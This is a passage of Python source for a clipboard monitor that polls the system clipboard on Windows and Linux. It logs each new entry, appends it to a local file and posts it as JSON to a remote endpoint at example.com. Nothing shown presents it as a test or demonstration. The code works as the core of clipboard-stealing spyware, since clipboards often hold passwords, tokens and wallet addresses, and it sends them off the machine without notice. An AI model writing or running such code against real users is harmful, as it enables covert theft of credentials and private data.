        os.makedirs(output_dir)

# Clipboard monitoring functions
def get_windows_clipboard_content() -> Optional[bytes]:
    CF_TEXT = 1
    CF_BITMAP = 2
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32

    user32.OpenClipboard.argtypes = [wintypes.HWND]
    user32.OpenClipboard.restype = wintypes.BOOL
    user32.GetClipboardData.restype = wintypes.HANDLE
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    if not user32.OpenClipboard(None):
        return None

    try:
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            handle = user32.GetClipboardData(CF_TEXT)
            locked_handle = kernel32.GlobalLock(handle)
            clipboard_data = ctypes.c_char_p(locked_handle).value
            kernel32.GlobalUnlock(locked_handle)
            return clipboard_data.decode("utf-8")
        elif user32.IsClipboardFormatAvailable(CF_BITMAP):
            return b"<IMAGE_DATA>"
    finally:
        user32.CloseClipboard()

    return None

def get_linux_clipboard_content() -> Optional[str]:
    try:
        text = subprocess.check_output(["xclip", "-selection", "clipboard", "-o"], stderr=subprocess.DEVNULL)
        return text.decode("utf-8")
    except subprocess.CalledProcessError:
        return None

def get_clipboard_content() -> Optional[str]:
    if platform.system() == "Windows":
        return get_windows_clipboard_content()
    elif platform.system() == "Linux":
        return get_linux_clipboard_content()
    else:
        logging.error("Unsupported platform for clipboard monitoring")
        return None

# File operations
def save_to_file(content: str):
    with open(OUTPUT_FILE, "a", encoding="utf-8") as file:
        file.write(content + "\n")

# Send clipboard data to API
def send_to_api(data: str):
    try:
        conn = http.client.HTTPSConnection("example.com")
        payload = json.dumps({"clipboard_content": data})
        headers = {"Content-Type": "application/json"}
        conn.request("POST", "/api/clipboard", payload, headers)
        response = conn.getresponse()
        if response.status == 200:
            logging.info(f"Clipboard content sent to API successfully: {data}")
        else:
            logging.error(f"Failed to send clipboard content to API, status code: {response.status}")
    except Exception as e:
        logging.error(f"Failed to send clipboard content to API: {e}")

# Monitor clipboard history
def monitor_clipboard(interval: int, iterations: int) -> None:
    ensure_output_directory()
    previous_content = None

    for _ in range(iterations):
        try:
            current_content = get_clipboard_content()
            if current_content and current_content != previous_content:
                logging.info(f"Clipboard updated: {current_content}")
                save_to_file(current_content)
                send_to_api(current_content)
                previous_content = current_content
            else:
                logging.info("No new clipboard content detected.")
        except Exception as e:
            logging.error(f"Error during clipboard monitoring: {e}")
        time.sleep(interval)

